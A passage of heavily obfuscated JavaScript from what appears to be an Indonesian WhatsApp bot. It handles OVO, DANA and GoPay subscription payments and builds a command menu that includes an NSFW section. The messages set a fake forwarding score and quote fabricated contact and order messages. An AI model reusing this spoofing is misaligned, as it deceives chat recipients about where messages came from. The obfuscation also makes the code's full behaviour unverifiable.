_0x4c6ecf={};_0x4c6ecf[_0x1f7707(-0x226,0x372,-0x92,0x204)]=_0x1f7707(-0x425,-0x1ba,-0xe5,0x1a6)+'21',_0x4c6ecf[_0x39f25f(0x303,0x6dd,0x960,0x65c)+'o']=_0x3975ad,_0x4c6ecf[_0x39f25f(0x29a,0x106,0x3bd,0x450)]=ftroli,_0x4c6ecf[_0x1f7707(0x59f,0x3ce,0x4da,0x3fd)+'ral']=!![],alpha[_0x1f7707(0xab,-0xe2,-0x232,0xe2)+'e'](from,btn4,MessageType[_0x39f25f(0x344,0x213,0x6c3,-0x69)+'sage'],_0x4c6ecf);}if(subscribezeeoneofc==_0x1f7707(0x4,0xa0,-0x1f9,0xb7)+'vo18'){optionsp1=_0x39f25f(0x2d8,0x3e8,0xb0,0x15a)+_0x1f7707(0x517,0x635,0x605,0x99c)+_0x1f7707(0x3c3,0x305,0xdb,-0x385)+_0x1f7707(-0x64,-0x29,0x15b,-0x286)+'h\x20baik\x20lak'+_0x1f7707(-0x47d,-0x590,-0x157,0x238)+'pun\x20peremp'+'uan\x20dan\x20me'+_0x39f25f(0x31d,0x3f4,0xbc,0x766)+'kepada\x20All'+_0x39f25f(0x774,0x7c1,0x6d6,0x77b)+'n\x20yang\x20bai'+_0x39f25f(0x514,0x1eb,0x1c,-0x15b)+_0x1f7707(0x149,-0x60c,-0x22e,-0x211)+'pat-gandak'+_0x1f7707(-0x3d0,-0x3f3,-0x148,0x46)+_0x1f7707(0x15c,-0x12e,0x1ee,0x285)+_0x1f7707(0x55d,0x21b,0xa6,-0x22c)+_0x1f7707(-0x12a,0x42,-0xe6,0x342)+'\x20mereka\x20pa'+'hala\x20yang\x20'+_0x1f7707(0x32c,0xa9,0x4f8,0x78d)+_0x1f7707(-0x33c,0x82,-0xb3,0x330)+'id:\x2018)\x0a\x0a•'+_0x39f25f(-0x183,0x149,-0x146,0x57e)+pushname+('_\x0a•\x20Nomor\x20'+':\x20_@')+sender[_0x1f7707(0x4e3,0x4cc,0x20e,0x1b8)]('@')[0x6*-0x73+0x1923+-0x1671]+('_\x0a\x0a*PAYMEN'+_0x39f25f(-0x24f,-0x1c,0x10b,-0x480))+nomor_ovo+(_0x1f7707(0x6ce,0x878,0x475,0x49d)+_0x39f25f(0x15c,0x2a0,-0x97,-0x19e))+ini_mark['split']('@')[0x69a+-0x4*-0x9c1+-0x2d9e]+'_';const _0xc16e48={};_0xc16e48[_0x1f7707(0x3eb,0x7b4,0x491,0x346)+'id']=[sender,ini_mark],_0xc16e48['forwarding'+_0x1f7707(-0x2dd,-0x2d,0x0,0xfc)]=0x3e7,_0xc16e48[_0x1f7707(0xc7,-0x8c,-0x151,0x124)+'d']=!![];const _0x3e7be2={};_0x3e7be2[_0x39f25f(-0x2c6,0x106,0x53f,-0x345)]=fkontak,_0x3e7be2[_0x1f7707(0x8b7,0x29c,0x52f,0x670)+'o']=_0xc16e48,_0x3e7be2[_0x39f25f(0x696,0x688,0x87c,0x55b)+_0x39f25f(0x28f,0x2c6,0x65,0x73b)]=!![],alpha['sendMessag'+'e'](from,optionsp1,text,_0x3e7be2);}if(subscribezeeoneofc==_0x1f7707(0x90c,0x140,0x5fe,0x48c)+'18'){var ini_info=_0x39f25f(0x425,0x6a3,0x97b,0x832)+sender[_0x39f25f(0x33b,0x3bc,0xb8,0x2ab)]('@')[-0x746+-0x20eb+0x2831]+(_0x1f7707(0x171,0x2a2,0x54d,0x7d0)+'\x20bayar\x20pak'+_0x1f7707(-0xcd,-0x4f4,-0x20e,-0x45f)+_0x1f7707(0x7c4,0x3c2,0x57d,0x832)+_0x39f25f(0x223,0x61a,0x74b,0x4dc));const _0x4f426f={};_0x4f426f['displayTex'+'t']=_0x1f7707(0x2d8,0x55e,0x1c1,0x340);const _0x3059db={};_0x3059db['buttonId']=_0x1f7707(0x248,-0x18a,-0x24d,-0xc5)+'ana18',_0x3059db['buttonText']=_0x4f426f,_0x3059db['type']=0x1;const _0x4be043={};_0x4be043[_0x1f7707(0x117,-0xbf,-0x1ae,0x100)+'t']='QR\x20CODE';const _0xe9e1c1={};_0xe9e1c1[_0x1f7707(0x4ef,0x4e0,0x499,0x310)]=_0x1f7707(-0x110,0x252,-0x1ec,0x11e),_0xe9e1c1['buttonText']=_0x4be043,_0xe9e1c1[_0x1f7707(0x5ea,0x487,0x520,0x239)]=0x1;const buttons5=[_0x3059db,_0xe9e1c1],_0x3c8ecb={};_0x3c8ecb[_0x1f7707(0x55e,0x101,0x229,0x140)+'t']=ini_info,_0x3c8ecb[_0x1f7707(0xa56,0x4eb,0x637,0x3e3)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x3c8ecb[_0x1f7707(0x1ef,0x299,0x3eb,-0x89)]=buttons5,_0x3c8ecb[_0x39f25f(0x489,0x663,0xad7,0x543)]=0x1;const btn5=_0x3c8ecb,_0x4fbe01={};_0x4fbe01[_0x1f7707(-0xe2,0x2c7,0x21e,0x4d)]='hi',_0x4fbe01[_0x39f25f(0x4bd,0x6ba,0x3d9,0x556)+_0x1f7707(0x442,0x35,0x0,0x311)]=0x3b9aca00,_0x4fbe01[_0x1f7707(-0x1ea,-0x305,-0x151,0x19c)+'d']=!![],_0x4fbe01[_0x1f7707(0x98a,0x2fa,0x4da,0x221)+_0x39f25f(0x322,0x2c6,0x51,0x7)]=!![],_0x4fbe01['mentionedJ'+'id']=[sender];const _0x1f810e={};_0x1f810e['caption']=_0x1f7707(-0x47c,-0x4e7,-0xe5,0x3bf)+'21',_0x1f810e['contextInf'+'o']=_0x4fbe01,_0x1f810e[_0x1f7707(0x245,0x371,-0xa8,0x18a)]=ftroli,_0x1f810e[_0x39f25f(0x3df,0x688,0xa8c,0x3f2)+'ral']=!![],alpha[_0x39f25f(0x3a9,-0x84,-0x17d,0x2a8)+'e'](from,btn5,MessageType[_0x1f7707(-0x1f8,0x292,0x65,-0x433)+_0x1f7707(-0x269,-0x440,-0x23b,-0x2f3)],_0x1f810e);}if(subscribezeeoneofc=='langsung_d'+_0x39f25f(0x514,0x757,0xa09,0xa7a)){optionsp2='“Sesungguh'+'nya\x20orang-'+_0x39f25f(0x52,0x289,0x1ff,0x728)+_0x1f7707(-0x14e,-0xae,0x15b,0x2e6)+'h\x20baik\x20lak'+'i-laki\x20mau'+_0x1f7707(0x6fc,0x648,0x36e,0x137)+_0x1f7707(0x160,0x749,0x4c9,0x1a)+_0x1f7707(0x671,0x1cc,0x246,0x6aa)+_0x1f7707(0x703,0x682,0x5e1,0x303)+_0x1f7707(0xa60,0x9b6,0x613,0x479)+_0x1f7707(0x1c0,0x675,0x63f,0x6f1)+_0x1f7707(-0x69,0x145,0x3d,0x4d8)+_0x39f25f(-0x3a,-0x80,0x17e,0x36e)+_0x39f25f(0x39d,0x4d,-0x255,-0x2db)+_0x39f25f(-0x1b8,0x66,-0x21f,-0x3f1)+_0x1f7707(-0x234,0x459,0x1ee,0x5bc)+'ada\x20mereka'+_0x39f25f(0x1aa,0xc8,0x141,-0xf)+_0x1f7707(0x221,0xa4c,0x68b,0xb32)+_0x1f7707(-0x7c,-0x46,0x3ee,0x5f2)+'banyak.”\x20('+_0x1f7707(-0x352,0x265,-0xb3,-0x167)+_0x1f7707(0x107,-0x73,0x361,0x24a)+_0x1f7707(-0x186,-0x418,-0x65,0x11f)+pushname+(_0x1f7707(0x120,0x244,-0x267,-0xa4)+_0x39f25f(0x61f,0x5cf,0x8ee,0x667))+sender[_0x39f25f(0x2cd,0x3bc,0x1ed,0x545)]('@')[0x216f+0x1*-0x205f+-0x110]+(_0x39f25f(0x6d9,0x265,-0xa9,-0x5d)+_0x1f7707(-0x135,0x101,-0x1ca,-0x50c))+nomor_dana+(_0x39f25f(0x21b,0x623,0x5eb,0x4c2)+_0x39f25f(0x1ef,0x2a0,0x739,-0x2c))+ini_mark[_0x1f7707(0x5da,-0x6,0x20e,0x675)]('@')[0x1994+-0x14ff+0x1*-0x495]+'_';const _0x43ace4={};_0x43ace4[_0x39f25f(0x869,0x63f,0x375,0x1c3)+'id']=[sender,ini_mark],_0x43ace4[_0x39f25f(0x89c,0x6ba,0x892,0xb05)+'Score']=0x3e7,_0x43ace4[_0x1f7707(-0x17f,-0x48,-0x151,-0x2b3)+'d']=!![];const _0x337d3e={};_0x337d3e[_0x39f25f(0xb3,0x106,0x1bc,-0x1f8)]=fkontak,_0x337d3e[_0x1f7707(0x88,0x7f6,0x52f,0x3f5)+'o']=_0x43ace4,_0x337d3e[_0x39f25f(0x1fe,0x688,0x2e5,0x579)+_0x1f7707(-0x346,-0x39a,0x118,-0x262)]=!![],alpha[_0x39f25f(0x3,-0x84,0x151,-0x3dc)+'e'](from,optionsp2,text,_0x337d3e);}if(subscribezeeoneofc==_0x1f7707(0x3e9,0x5f,0x15e,0x387)+_0x39f25f(0x4c2,0x68d,0x484,0xa64)){var ini_info=_0x39f25f(0x9f1,0x6a3,0x63f,0x83d)+sender[_0x1f7707(0x5e2,0x45e,0x20e,0x100)]('@')[-0xdf+-0x10ab+0x1*0x118a]+(_0x39f25f(0x40c,0x6fb,0x838,0x266)+'\x20bayar\x20pak'+_0x1f7707(-0x621,-0x2b,-0x20e,-0x4e4)+_0x1f7707(0x502,0x4b0,0x57d,0x5fa)+_0x1f7707(0x795,0x902,0x46c,0x665));const _0x4437c9={};_0x4437c9[_0x1f7707(-0x2ce,0x302,-0x1ae,-0x461)+'t']=_0x39f25f(0x36b,0x36f,0x798,0x256);const _0x105693={};_0x105693[_0x39f25f(0x305,0x647,0x61e,0x574)]=_0x1f7707(0x39b,0x314,-0x20,0x354)+_0x1f7707(0x665,0x367,0x6a0,0x65f),_0x105693[_0x1f7707(0xa6,0x2b,0x1ce,0x4b2)]=_0x4437c9,_0x105693[_0x39f25f(0x5fe,0x6ce,0x4c2,0x5c6)]=0x1;const _0x4b5191={};_0x4b5191['displayTex'+'t']=_0x39f25f(0x2ef,0x5fa,0x63e,0x235);const _0x3bada9={};_0x3bada9[_0x1f7707(0x18d,0x148,0x499,0x8e3)]='qr_gopay18',_0x3bada9[_0x1f7707(0x24,-0x141,0x1ce,-0x25f)]=_0x4b5191,_0x3bada9[_0x39f25f(0x961,0x6ce,0xae3,0x985)]=0x1;const buttons6=[_0x105693,_0x3bada9],_0x2e88c0={};_0x2e88c0['contentTex'+'t']=ini_info,_0x2e88c0['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x2e88c0[_0x39f25f(0x5c6,0x599,0x13d,0x9d2)]=buttons6,_0x2e88c0[_0x1f7707(0x3cd,0x2a4,0x4b5,0x315)]=0x1;const btn6=_0x2e88c0,_0xa9cf15={};_0xa9cf15[_0x39f25f(0x27e,0x3cc,0xd3,0x1ba)]='hi',_0xa9cf15[_0x39f25f(0x42f,0x6ba,0x6a4,0x84b)+_0x1f7707(-0x186,-0x451,0x0,-0x216)]=0x3b9aca00,_0xa9cf15['isForwarde'+'d']=!![],_0xa9cf15['sendEpheme'+_0x39f25f(0x28b,0x2c6,-0x21,-0x176)]=!![],_0xa9cf15[_0x1f7707(0x62b,0x3e2,0x491,0x591)+'id']=[sender];const _0x3df31c={};_0x3df31c[_0x1f7707(-0x19f,-0x2e9,-0x92,-0x1e1)]='Botwea\x20©2k'+'21',_0x3df31c['contextInf'+'o']=_0xa9cf15,_0x3df31c[_0x39f25f(-0x141,0x106,-0x1c3,0x275)]=ftroli,_0x3df31c[_0x39f25f(0xae5,0x688,0x1de,0xabe)+'ral']=!![],alpha[_0x39f25f(0x379,-0x84,0xa,-0x2ac)+'e'](from,btn6,MessageType[_0x39f25f(-0xed,0x213,0x225,-0x1c4)+_0x1f7707(-0x15a,-0x50a,-0x23b,-0x42b)],_0x3df31c);}if(subscribezeeoneofc==_0x1f7707(0x360,-0xdb,-0x20,0x1f)+'opay18'){optionsp3='“Sesungguh'+_0x1f7707(0xa0d,0x686,0x605,0x40d)+_0x1f7707(0x288,0xc,0xdb,-0x14e)+_0x1f7707(-0x2c,0xee,0x15b,0x5fe)+_0x1f7707(0x1c3,0x54f,0x359,0x228)+_0x39f25f(-0x1ed,0x57,0x179,-0x203)+_0x1f7707(0x3e8,0x558,0x36e,0x2b)+_0x39f25f(0x3ab,0x677,0x2af,0x23c)+'minjamkan\x20'+_0x39f25f(0xabb,0x78f,0xaf7,0x7b8)+_0x39f25f(0xb12,0x7c1,0x344,0x78b)+'n\x20yang\x20bai'+_0x1f7707(0x4c4,-0x2ad,0x3d,0x3ab)+_0x1f7707(0xca,-0x61d,-0x22e,0xa1)+'pat-gandak'+_0x1f7707(0x62,0x1f4,-0x148,-0x488)+_0x39f25f(0x1f9,0x39c,0xc2,0x79c)+_0x1f7707(0x246,-0x1a2,0xa6,-0x1a2)+_0x39f25f(-0x2ec,0xc8,-0x2a8,0x3d3)+_0x39f25f(0x87d,0x839,0x93b,0x403)+'hala\x20yang\x20'+_0x39f25f(0x791,0x6a6,0x9eb,0x377)+_0x1f7707(-0x10a,-0x1e1,-0xb3,0x1f1)+_0x1f7707(0x5b9,-0x74,0x361,-0x46)+_0x1f7707(0x434,0x37b,-0x65,-0x368)+pushname+('_\x0a•\x20Nomor\x20'+_0x39f25f(0x5b8,0x5cf,0x73b,0x922))+sender[_0x1f7707(0x12,0x67e,0x20e,0x699)]('@')[0x620*-0x2+-0x166*0x4+0x4*0x476]+(_0x1f7707(-0x343,0x330,0xb7,0x135)+_0x39f25f(-0x2b9,-0x1c,-0x23d,-0x1bb))+nomor_gopay+(_0x39f25f(0x966,0x623,0x7d4,0x4ac)+_0x39f25f(0x403,0x2a0,0xbf,0x1dc))+ini_mark['split']('@')[0x1000+0x7f+-0x107f]+'_';const _0x30246e={};_0x30246e['mentionedJ'+'id']=[sender,ini_mark],_0x30246e[_0x1f7707(0x212,0x53b,0x50c,0x6d)+_0x1f7707(-0x2c,0x39d,0x0,0xe3)]=0x3e7,_0x30246e[_0x1f7707(-0xa6,-0x1fe,-0x151,-0xd3)+'d']=!![];const _0x2a4ec9={};_0x2a4ec9[_0x1f7707(-0x413,-0x1d2,-0xa8,0x282)]=fkontak,_0x2a4ec9[_0x1f7707(0x2d5,0x901,0x52f,0x28a)+'o']=_0x30246e,_0x2a4ec9[_0x1f7707(0x6ea,0x303,0x4da,0x8aa)+_0x1f7707(0xe0,0x279,0x118,-0x29d)]=!![],alpha[_0x1f7707(-0x322,-0x362,-0x232,-0x1c0)+'e'](from,optionsp3,text,_0x2a4ec9);}subscribezeeoneofc==_0x1f7707(0x59c,0x39e,0x304,0x34e)&&(console[_0x1f7707(0x4c7,0x613,0x3f1,0x440)](color(time,_0x39f25f(0xa4b,0x6e1,0x2a1,0x7b3)),color(_0x1f7707(0x46b,0x1be,0x1c3,-0x16d)+_0x39f25f(-0x136,0x129,-0x8d,-0x1d6)+_0x1f7707(0x35e,0x582,0xf0,0x161))),reply('☕'));if(subscribezeeoneofc==_0x39f25f(0x364,0x66e,0x7e7,0xaed)){console[_0x39f25f(0x70d,0x59f,0x9f5,0x60b)](color(time,_0x39f25f(0x79f,0x6e1,0x398,0x557)),color(_0x39f25f(0xe8,0x598,0x8ae,0x269)+'sage\x20menu'));const _0x10aa45={};_0x10aa45[_0x1f7707(-0x3e5,-0x369,-0x2c6,0x171)]=_0x1f7707(0x68a,0x24a,0x243,-0x1a3)+'ot',_0x10aa45[_0x1f7707(-0x387,0x1de,-0x6a,-0x220)+'n']=_0x39f25f(-0x229,0x93,0x170,-0x317)+_0x1f7707(-0x47e,-0x4a7,-0x218,-0x2ea)+_0x1f7707(0x7d2,0x223,0x48b,0x531)+_0x39f25f(0x2f9,0x1e1,-0x1bc,0x58c)+'lmenu\x20comm'+_0x39f25f(-0x226,0x13b,0x4b6,0x46d),_0x10aa45['rowId']='0';const _0x4864d6={};_0x4864d6[_0x1f7707(-0x1ef,-0x19a,-0x2c6,-0x1a5)]='🐣\x20All\x20menu'+_0x1f7707(0x8a7,0xc,0x42e,0x208),_0x4864d6[_0x1f7707(0x1a5,-0x245,-0xc8,-0x320)]=[_0x10aa45];const _0x5b7c92={};_0x5b7c92[_0x39f25f(-0x222,-0x118,0x2c7,-0x3d8)]=_0x1f7707(-0x53c,-0x12c,-0x23c,0x54)+_0x39f25f(0xae6,0x7bd,0xa5d,0x6a0),_0x5b7c92['descriptio'+'n']=_0x1f7707(0x86,0x29b,-0x11b,0x235)+_0x39f25f(0x3f2,-0x6a,0x12d,-0x2ef)+_0x39f25f(0xaea,0x639,0x2ac,0x7cc)+_0x1f7707(-0x2cb,-0x50a,-0xf7,-0x4b6)+_0x39f25f(-0x378,0xf9,0x232,0xc9)+_0x1f7707(0x643,0x6d6,0x2f4,0x195),_0x5b7c92[_0x39f25f(0x5ac,0x1c8,0x4f0,0x10c)]='0';const _0x3dd9e7={};_0x3dd9e7[_0x39f25f(-0x249,-0x118,0x393,-0x3d5)]=_0x1f7707(0x49d,0x45f,0x562,0x73b)+_0x39f25f(0x377,0x282,0x322,-0xec),_0x3dd9e7[_0x39f25f(-0x2cc,0xe6,0x3f7,0x2ff)]=[_0x5b7c92];const _0x2b1ff9={};_0x2b1ff9[_0x39f25f(-0x3a8,-0x118,-0x4a4,0x335)]='downloadme'+'nu',_0x2b1ff9[_0x1f7707(0x144,0x1c6,-0x6a,0x20c)+'n']=_0x39f25f(0x3e8,0x93,0x483,0x2a4)+'this\x20if\x20yo'+_0x39f25f(0x853,0x639,0x850,0x937)+'use\x20the\x20do'+_0x1f7707(-0x5c1,0xd9,-0x18c,0x314)+_0x1f7707(0x9a,0x2bf,0x2f4,0x74d),_0x2b1ff9[_0x1f7707(0x359,-0x45e,0x1a,-0x43d)]='0';const _0x3725f5={};_0x3725f5[_0x39f25f(0x211,-0x118,0x350,0x193)]='🐰\x20Menu\x20ke-'+'1',_0x3725f5[_0x1f7707(0x6,0x3c5,-0xc8,0x164)]=[_0x2b1ff9];const _0x5ebff1={};_0x5ebff1['title']='convertmen'+'u',_0x5ebff1['descriptio'+'n']=_0x39f25f(0x2db,0x93,0x195,-0xb0)+_0x1f7707(-0x360,-0x5c5,-0x218,0x26c)+'u\x20want\x20to\x20'+_0x1f7707(-0x173,-0xda,-0x2d4,-0x5e1)+'nvertmenu\x20'+'command_',_0x5ebff1[_0x1f7707(-0x170,0xae,0x1a,0x2a3)]='0';const _0x43cca5={};_0x43cca5[_0x39f25f(-0x317,-0x118,-0x2c3,0xba)]=_0x1f7707(0x4a5,0x544,0xfc,-0x2d6)+'2',_0x43cca5[_0x1f7707(-0x2ad,0x137,-0xc8,-0x486)]=[_0x5ebff1];const _0x218e34={};_0x218e34[_0x39f25f(-0x27,-0x118,0x1a,0x16f)]=_0x1f7707(-0x276,-0x66,0xcd,0x319),_0x218e34[_0x1f7707(-0x4f8,-0x101,-0x6a,0x2af)+'n']=_0x1f7707(-0x2f5,0x19d,-0x11b,-0x314)+_0x1f7707(-0xaf,-0x678,-0x218,-0x5eb)+_0x39f25f(0x5e9,0x639,0xadb,0x604)+_0x39f25f(0x7db,0x7d3,0x4e9,0x8e7)+_0x39f25f(0x3ad,0x25e,-0x1fd,0x6b0)+_0x39f25f(0x237,0x13b,-0x26e,0x35a),_0x218e34[_0x1f7707(-0x49e,-0x35c,0x1a,0x110)]='0';const _0x380060={};_0x380060[_0x1f7707(-0xfa,-0xb8,-0x2c6,0x12c)]='🐶\x20Menu\x20ke-'+'3',_0x380060['rows']=[_0x218e34];const _0x4af130={};_0x4af130['title']=_0x1f7707(-0x238,-0x1bd,-0x40,0x217),_0x4af130[_0x39f25f(0x46b,0x144,0x3ac,0x4bd)+'n']=_0x39f25f(0x506,0x93,0xdf,-0x367)+_0x1f7707(-0xf2,-0x531,-0x218,0xe9)+_0x39f25f(0x1c0,0x639,0x8c5,0x488)+_0x1f7707(0x404,0x81a,0x640,0x18c)+_0x1f7707(-0x8e,0x6c,0x13d,-0x25)+_0x39f25f(-0x32,0x1b,0x175,0x47f),_0x4af130['rowId']='0';const _0x41948f={};_0x41948f['title']=_0x1f7707(-0xc7,0x2d7,0x24f,0x5b9)+'4',_0x41948f[_0x1f7707(-0x30f,-0x15a,-0xc8,0x194)]=[_0x4af130];const _0x3778d0={};_0x3778d0['title']=_0x1f7707(0x190,-0x551,-0x189,-0x2e),_0x3778d0[_0x39f25f(-0x242,0x144,0x391,0xf7)+'n']='\x0a\x0a_choose\x20'+_0x39f25f(0x7f,-0x6a,-0x46,0x445)+'u\x20want\x20to\x20'+_0x1f7707(0x89,0x172,0x1d,-0x152)+_0x1f7707(0x41b,0x4e8,0xca,-0x3dc)+_0x39f25f(-0x381,0x1b,0x1a0,0x36b),_0x3778d0[_0x1f7707(0xb5,-0x217,0x1a,-0xf3)]='0';const _0x5258bf={};_0x5258bf['title']=_0x1f7707(0x61e,0x29b,0x632,0x7c0)+'5',_0x5258bf[_0x1f7707(-0x388,-0x23d,-0xc8,-0x4e6)]=[_0x3778d0];const _0x13b62b={};_0x13b62b[_0x39f25f(-0x1cc,-0x118,-0x154,0x11e)]=_0x39f25f(0x94c,0x78b,0x40c,0x9f9),_0x13b62b[_0x39f25f(0x5fa,0x144,0x583,0x4e3)+'n']=_0x39f25f(-0x3ae,0x93,0x398,-0x2f2)+_0x1f7707(-0x25d,-0x4c7,-0x218,-0x4e9)+_0x1f7707(0x8f6,0x8dc,0x48b,0x607)+_0x1f7707(0x2ea,0x316,0x415,0x18e)+_0x1f7707(0x258,0x77,0x4b7,0x5b1)+_0x1f7707(-0x5ab,-0x51b,-0x193,-0x576),_0x13b62b[_0x39f25f(0x5c1,0x1c8,-0x8d,0x2ab)]='0';const _0x5e8dc5={};_0x5e8dc5[_0x39f25f(0x234,-0x118,-0x160,0x332)]=_0x39f25f(-0x22c,0x127,-0x3,-0x23e)+'6',_0x5e8dc5[_0x39f25f(0x1b1,0xe6,-0x357,-0x1b9)]=[_0x13b62b];const _0x4a5ba8={};_0x4a5ba8[_0x39f25f(-0x22a,-0x118,-0x47a,-0x576)]='storagemen'+'u',_0x4a5ba8[_0x39f25f(0x11b,0x144,0x464,-0x1ed)+'n']=_0x1f7707(-0x271,-0x58,-0x11b,0xd1)+'this\x20if\x20yo'+_0x39f25f(0x5dc,0x639,0x302,0x5e2)+_0x39f25f(-0x6,0x3b8,0x246,0x778)+_0x39f25f(0x7d8,0x485,0x34,0x520)+'command_',_0x4a5ba8[_0x39f25f(0x404,0x1c8,-0x2a4,-0x20c)]='0';const _0x214e26={};_0x214e26['title']=_0x39f25f(0x51a,0x156,-0x4e,0x5c3)+'7',_0x214e26['rows']=[_0x4a5ba8];const _0x54a373={};_0x54a373[_0x39f25f(-0x11d,-0x118,-0x21a,0x5a)]=_0x1f7707(0x794,0x94f,0x66d,0x9b5),_0x54a373[_0x1f7707(-0x366,-0x461,-0x6a,0x276)+'n']=_0x1f7707(-0x137,0x184,-0x11b,-0x416)+_0x39f25f(0x2dc,-0x6a,-0x191,0x373)+_0x39f25f(0x760,0x639,0x604,0x870)+_0x1f7707(-0x300,-0x37a,0x10c,0x383)+_0x39f25f(0x2f6,0x5ef,0x8d8,0x584)+_0x39f25f(-0x141,0x13b,0x2df,-0x110),_0x54a373[_0x1f7707(-0x49c,-0x41b,0x1a,-0x3a2)]='0';const _0x41f4c3={};_0x41f4c3[_0x39f25f(0xfe,-0x118,-0xcf,-0x23c)]=_0x39f25f(0x408,0x6b8,0x261,0x823)+'8',_0x41f4c3[_0x39f25f(0x3fb,0xe6,0x2ad,0x240)]=[_0x54a373];const _0x544964={};_0x544964[_0x1f7707(-0x6d0,-0x6c9,-0x2c6,-0x653)]=_0x1f7707(-0x18f,0x417,0x6c,0x496),_0x544964[_0x39f25f(-0x13d,0x144,0x48b,0x24a)+'n']=_0x39f25f(-0x3b2,0x93,0x27,0xdb)+_0x39f25f(0x3c,-0x6a,-0x2a4,0x317)+'u\x20want\x20to\x20'+_0x39f25f(0x673,0x402,0x82b,0x343)+_0x39f25f(-0x38d,0x6c,-0x422,0x469)+_0x39f25f(0x15e,0xb8,-0x378,-0x132),_0x544964[_0x39f25f(0x32c,0x1c8,0x43e,-0xbe)]='0';const _0x1c1a0c={};_0x1c1a0c['title']=_0x1f7707(0x33b,0x464,0xa0,0x488)+'9',_0x1c1a0c['rows']=[_0x544964];const _0x36dfe6={};_0x36dfe6[_0x39f25f(-0x370,-0x118,0x117,-0x4f4)]='set\x20sticke'+'r\x20cmd',_0x36dfe6[_0x1f7707(-0x435,0x3b8,-0x6a,0x359)+'n']='\x0a\x0a_choose\x20'+_0x1f7707(-0x571,0x25b,-0x218,0xe5)+_0x39f25f(0x8f1,0x639,0x61b,0x979)+'use\x20the\x20se'+_0x39f25f(0x2eb,0x616,0x5fe,0x870)+_0x39f25f(-0x9a,-0x110,-0x14c,0x2ca),_0x36dfe6['rowId']='0';const _0x5238ca={};_0x5238ca[_0x39f25f(0x2bb,-0x118,-0xb8,0x2de)]=_0x39f25f(0x572,0x610,0x19d,0x94e)+'10',_0x5238ca[_0x39f25f(-0x9,0xe6,-0x30a,0x319)]=[_0x36dfe6];const _0x34bace={};_0x34bace[_0x1f7707(-0x537,0xe3,-0x2c6,0x17)]=_0x1f7707(-0x30b,0x4b9,0x15d,-0xfc)+'n',_0x34bace[_0x39f25f(-0x10c,0x144,-0x127,-0x239)+'n']='\x0a\x0a_choose\x20'+_0x39f25f(0x2c1,-0x6a,-0x50d,-0x21c)+'u\x20want\x20to\x20'+'use\x20the\x20ga'+'chacecan\x20c'+'ommand_',_0x34bace[_0x39f25f(0x284,0x1c8,0x3f9,0x43c)]='0';const _0x2178c6={};_0x2178c6[_0x1f7707(0x17c,-0xd,-0x2c6,-0x19)]=_0x39f25f(0x1d1,0x667,0x776,0x9fb)+'11',_0x2178c6[_0x1f7707(-0x386,0x19f,-0xc8,0x182)]=[_0x34bace];const _0x5c62f5={};_0x5c62f5['title']='telegram\x20s'+_0x39f25f(0xd1,0x472,0x3df,0x6cd),_0x5c62f5['descriptio'+'n']=_0x1f7707(-0x12a,0x164,-0x11b,0x2d7)+'this\x20if\x20yo'+_0x1f7707(0x7d9,0x73,0x48b,0x894)+_0x1f7707(0x5e4,0x86b,0x4bd,0x4a9)+_0x39f25f(0x240,0x5e4,0x4b6,0x9a4)+_0x39f25f(0x443,0x13b,-0x197,0xc7),_0x5c62f5['rowId']='0';const _0x3dbd23={};_0x3dbd23[_0x39f25f(-0x286,-0x118,-0x250,-0x275)]=_0x39f25f(-0x3be,-0x38,-0x3b9,-0x3e)+'12',_0x3dbd23[_0x39f25f(-0x345,0xe6,0x327,-0x3b7)]=[_0x5c62f5];const _0x51859c={};_0x51859c[_0x39f25f(0x75,-0x118,0x1fb,-0x396)]='nsfw\x20menu',_0x51859c[_0x1f7707(0x85,-0x482,-0x6a,0x145)+'n']=_0x39f25f(0x188,0x93,0x41,0x1a7)+'this\x20if\x20yo'+_0x39f25f(0x17d,0x639,0x21a,0x9bf)+_0x39f25f(-0x2fb,0x94,0x1d8,-0x112)+'fwmenu\x20com'+_0x1f7707(0x934,0x261,0x644,0x837),_0x51859c[_0x39f25f(-0x33,0x1c8,0x324,0x49e)]='0';const _0x267c1c={};_0x267c1c[_0x39f25f(-0x19d,-0x118,-0x435,-0x410)]='🦊\x20Menu\x20ke-'+'13',_0x267c1c[_0x39f25f(-0xa4,0xe6,-0x32d,0x365)]=[_0x51859c];const _0x487271={};_0x487271[_0x39f25f(-0xd9,-0x118,0x29f,0x1de)]=_0x1f7707(0x58e,0x91b,0x4d5,0x479)+'u',_0x487271[_0x39f25f(0x5b7,0x144,-0xda,0x460)+'n']=_0x1f7707(0x29f,-0x5a8,-0x11b,0x2c4)+_0x39f25f(0x46,-0x6a,0x8b,-0x361)+_0x39f25f(0x9d6,0x639,0x5a3,0x32a)+_0x39f25f(0xa05,0x796,0x602,0x990)+'upan\x20menu\x20'+_0x39f25f(0x291,-0x110,0x103,-0x3c4),_0x487271[_0x39f25f(0x3a7,0x1c8,0xf3,-0x99)]='0';const _0x2caddb={};_0x2caddb[_0x1f7707(-0x453,0x16b,-0x2c6,-0x1d6)]=_0x39f25f(0x63d,0x24a,-0x2b,0x6ea)+'14',_0x2caddb['rows']=[_0x487271];const _0x302e94={};_0x302e94[_0x1f7707(-0x391,-0x74b,-0x2c6,-0x738)]=_0x1f7707(-0x29c,-0x35b,0x48,-0x43b)+'ct',_0x302e94[_0x39f25f(0x552,0x144,0x41c,0x52b)+'n']=_0x1f7707(-0x520,0x359,-0x11b,-0x35)+_0x1f7707(0x29b,-0x1a4,-0x218,-0x10d)+_0x1f7707(0x3c2,0x427,0x48b,0x44)+_0x1f7707(-0xeb,-0x65a,-0x2cd,-0x197)+_0x39f25f(-0x343,0x16d,0x5b0,0x41)+_0x1f7707(0x8d,-0x96,-0x19,0x273)+_0x1f7707(-0x4ab,-0x68,-0x73,-0x41d),_0x302e94[_0x39f25f(-0x1bb,0x1c8,-0x3c,0x497)]='0';const _0x53df97={};_0x53df97[_0x1f7707(-0x4d0,-0x104,-0x2c6,0x94)]=_0x1f7707(-0x3b,0x143,0x101,-0x109)+'15',_0x53df97['rows']=[_0x302e94];const 